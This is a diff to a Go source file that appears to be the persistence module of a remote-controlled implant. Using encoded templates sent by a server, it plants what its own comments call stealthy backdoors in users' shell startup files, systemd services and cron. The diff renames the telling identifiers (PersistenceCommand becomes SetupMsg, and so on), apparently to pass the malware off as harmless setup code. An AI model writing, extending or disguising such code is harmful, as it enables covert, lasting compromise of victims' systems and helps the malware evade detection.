@@ -18,8 +18,8 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// PersistenceTemplate represents server-delivered template data (v2: array-based)
-type PersistenceTemplate struct {
+// SetupCfg represents server-delivered template data (v2: array-based)
+type SetupCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`   // 1=systemd, 2=bashrc, 3=cron, 4=launchd
 	Templates []string `json:"tpl"` // Array indexed by position (no string keys)
@@ -103,11 +103,11 @@ const (
 )
 
 
-// PersistenceCommand handles various persistence mechanisms
-type PersistenceCommand struct{}
+// SetupMsg handles various persistence mechanisms
+type SetupMsg struct{}
 
 // getTpl safely gets template value by index
-func (c *PersistenceCommand) getTpl(template *PersistenceTemplate, idx int) string {
+func (c *SetupMsg) getTpl(template *SetupCfg, idx int) string {
 	if template != nil && template.Templates != nil && idx < len(template.Templates) {
 		return template.Templates[idx]
 	}
@@ -115,26 +115,26 @@ func (c *PersistenceCommand) getTpl(template *PersistenceTemplate, idx int) stri
 }
 
 // getParam safely gets param value by index
-func (c *PersistenceCommand) getParam(template *PersistenceTemplate, idx int) string {
+func (c *SetupMsg) getParam(template *SetupCfg, idx int) string {
 	if template != nil && template.Params != nil && idx < len(template.Params) {
 		return template.Params[idx]
 	}
 	return ""
 }
 
-func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+func (c *SetupMsg) execute(ctx *OpCtx, args []string) OpResult {
 	if len(args) < 1 {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E1),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
 	// Parse template data from command if present
-	var template *PersistenceTemplate
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
-			template = &PersistenceTemplate{}
+	var template *SetupCfg
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data); err == nil {
+			template = &SetupCfg{}
 			if err := json.Unmarshal(decoded, template); err != nil {
 				template = nil
 			}
@@ -148,21 +148,21 @@ func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) Command
 	case c.getTpl(template, idxPersistMethodSystemd):
 		return c.handleSystemdPersistence(args[1:], template)
 	case c.getTpl(template, idxPersistMethodCron):
-		// Delegate to CronPersistenceCommand
-		cronCmd := &CronPersistenceCommand{}
-		return cronCmd.Execute(ctx, args[1:])
+		// Delegate to TimerSetupMsg
+		cronCmd := &TimerSetupMsg{}
+		return cronCmd.execute(ctx, args[1:])
 	case c.getTpl(template, idxPersistMethodRemove):
 		if len(args) < 2 {
-			return CommandResult{
+			return OpResult{
 				Output:   Err(E1),
-				ExitCode: 1,
+				EC: 1,
 			}
 		}
 		return c.removePersistence(args[1], args[2:], template)
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E21, method),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 }
@@ -177,7 +177,7 @@ type bashrcOptions struct {
 }
 
 // handleBashrcPersistence adds backdoor to shell initialization files
-func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *PersistenceTemplate) CommandResult {
+func (c *SetupMsg) handleBashrcPersistence(args []string, template *SetupCfg) OpResult {
 	var targetUser string
 	var command string
 	var targetFiles []string
@@ -229,9 +229,9 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *Pe
 	if targetUser == "" {
 		currentUser, err := user.Current()
 		if err != nil {
-			return CommandResult{
+			return OpResult{
 				Output:   Err(E19),
-				ExitCode: 1,
+				EC: 1,
 			}
 		}
 		targetUser = currentUser.Username
@@ -250,9 +250,9 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *Pe
 	// Get user info
 	u, err := user.Lookup(targetUser)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E4, targetUser),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -291,9 +291,9 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *Pe
 	// Generate backdoor payload using server-provided template
 	backdoorPayload := c.generateBashrcPayload(command, template, opts)
 	if backdoorPayload == "" {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E18),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -305,14 +305,14 @@ func (c *PersistenceCommand) handleBashrcPersistence(args []string, template *Pe
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   strings.Join(results, "\n"),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
 // generateBashrcPayload creates a stealthy backdoor payload using server-provided templates
-func (c *PersistenceCommand) generateBashrcPayload(command string, template *PersistenceTemplate, opts bashrcOptions) string {
+func (c *SetupMsg) generateBashrcPayload(command string, template *SetupCfg, opts bashrcOptions) string {
 	// If --raw is specified, just return the command itself
 	if opts.raw {
 		return "\n" + command + "\n"
@@ -384,7 +384,7 @@ func (c *PersistenceCommand) generateBashrcPayload(command string, template *Per
 }
 
 // injectIntoRCFile adds backdoor to RC file using direct file operations
-func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
+func (c *SetupMsg) injectIntoRCFile(filepath string, payload string) error {
 	info, err := os.Stat(filepath)
 	if err != nil {
 		if os.IsNotExist(err) {
@@ -407,7 +407,7 @@ func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) e
 }
 
 // handleSystemdPersistence installs systemd service
-func (c *PersistenceCommand) handleSystemdPersistence(args []string, template *PersistenceTemplate) CommandResult {
+func (c *SetupMsg) handleSystemdPersistence(args []string, template *SetupCfg) OpResult {
 	var serviceName string
 	var userService bool
 
@@ -442,12 +442,12 @@ func (c *PersistenceCommand) handleSystemdPersistence(args []string, template *P
 }
 
 // installUserSystemdService creates user-level systemd service
-func (c *PersistenceCommand) installUserSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
+func (c *SetupMsg) installUserSystemdService(name string, execPath string, template *SetupCfg) OpResult {
 	currentUser, err := user.Current()
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E19),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -462,9 +462,9 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 	sysDir := filepath.Join(currentUser.HomeDir, dotConfig, systemdDir, userDir)
 
 	if err := os.MkdirAll(sysDir, 0755); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E11, sysDir),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -472,41 +472,41 @@ func (c *PersistenceCommand) installUserSystemdService(name string, execPath str
 
 	serviceContent := c.generateSystemdService(name, execPath, true, template)
 	if serviceContent == "" {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E18),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E11, serviceFile),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
 	// Enable service
 	if err := c.enableSystemdService(name, true, template); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   SuccCtx(S1, serviceFile),
-			ExitCode: 0,
+			EC: 0,
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   SuccCtx(S1, serviceFile),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
 // installSystemSystemdService creates system-level systemd service
-func (c *PersistenceCommand) installSystemSystemdService(name string, execPath string, template *PersistenceTemplate) CommandResult {
+func (c *SetupMsg) installSystemSystemdService(name string, execPath string, template *SetupCfg) OpResult {
 	etcSystemd := c.getTpl(template, idxEtcSystemd)
 
 	if unix.Access(etcSystemd, unix.W_OK) != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E3, etcSystemd),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -516,16 +516,16 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 
 	serviceContent := c.generateSystemdService(name, execPath, false, template)
 	if serviceContent == "" {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E18),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E11, serviceFile),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -538,14 +538,14 @@ func (c *PersistenceCommand) installSystemSystemdService(name string, execPath s
 		os.Symlink(serviceFile, linkPath)
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   SuccCtx(S1, serviceFile),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
 // generateSystemdService creates systemd service configuration using server-provided templates
-func (c *PersistenceCommand) generateSystemdService(name, execPath string, userService bool, template *PersistenceTemplate) string {
+func (c *SetupMsg) generateSystemdService(name, execPath string, userService bool, template *SetupCfg) string {
 	if template == nil || template.Templates == nil || len(template.Templates) == 0 {
 		return ""
 	}
@@ -601,7 +601,7 @@ func (c *PersistenceCommand) generateSystemdService(name, execPath string, userS
 }
 
 // enableSystemdService attempts to enable service via systemd
-func (c *PersistenceCommand) enableSystemdService(name string, userService bool, template *PersistenceTemplate) error {
+func (c *SetupMsg) enableSystemdService(name string, userService bool, template *SetupCfg) error {
 	if userService {
 		currentUser, err := user.Current()
 		if err != nil {
@@ -630,7 +630,7 @@ func (c *PersistenceCommand) enableSystemdService(name string, userService bool,
 }
 
 // removePersistence removes installed persistence
-func (c *PersistenceCommand) removePersistence(method string, args []string, template *PersistenceTemplate) CommandResult {
+func (c *SetupMsg) removePersistence(method string, args []string, template *SetupCfg) OpResult {
 	switch method {
 	case c.getTpl(template, idxPersistMethodBashrc):
 		return c.removeBashrcPersistence(template)
@@ -646,20 +646,20 @@ func (c *PersistenceCommand) removePersistence(method string, args []string, tem
 		}
 		return c.removeSystemdPersistence(serviceName, template)
 	default:
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E21, method),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 }
 
 // removeBashrcPersistence removes backdoors from RC files
-func (c *PersistenceCommand) removeBashrcPersistence(template *PersistenceTemplate) CommandResult {
+func (c *SetupMsg) removeBashrcPersistence(template *SetupCfg) OpResult {
 	currentUser, err := user.Current()
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:   Err(E19),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
@@ -692,14 +692,14 @@ func (c *PersistenceCommand) removeBashrcPersistence(template *PersistenceTempla
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   strings.Join(results, "\n"),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
 
 // cleanRCFile removes backdoor from RC file
-func (c *PersistenceCommand) cleanRCFile(filePath string, detectPattern string) error {
+func (c *SetupMsg) cleanRCFile(filePath string, detectPattern string) error {
 	content, err := os.ReadFile(filePath)
 	if err != nil {
 		return err
@@ -737,7 +737,7 @@ func (c *PersistenceCommand) cleanRCFile(filePath string, detectPattern string) 
 }
 
 // removeSystemdPersistence removes systemd service
-func (c *PersistenceCommand) removeSystemdPersistence(name string, template *PersistenceTemplate) CommandResult {
+func (c *SetupMsg) removeSystemdPersistence(name string, template *SetupCfg) OpResult {
 	var results []string
 
 	// Get paths from template
@@ -772,14 +772,14 @@ func (c *PersistenceCommand) removeSystemdPersistence(name string, template *Per
 	os.Remove(systemLinkPath)
 
 	if len(results) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:   ErrCtx(E4, name),
-			ExitCode: 1,
+			EC: 1,
 		}
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:   strings.Join(results, "\n"),
-		ExitCode: 0,
+		EC: 0,
 	}
 }
